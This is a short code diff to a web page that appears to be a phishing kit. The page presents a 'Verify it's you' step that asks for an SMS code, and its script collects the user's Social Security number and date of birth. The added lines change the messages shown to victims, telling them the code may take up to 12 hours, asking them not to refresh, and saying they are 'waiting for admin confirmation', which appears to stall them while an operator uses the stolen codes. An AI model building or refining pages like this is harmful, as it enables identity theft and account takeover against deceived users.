@@ -52,6 +52,8 @@
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
+                 <p>You should receive your access code within 12hrs. Please do not refresh this page and check your SMS within 12hrs.</p>
+            
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
             
@@ -129,7 +131,8 @@
                 return;
             }
 
-            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation.This might take awhile(hours). Please do not refresh page...</span>`;
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
+            
 
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
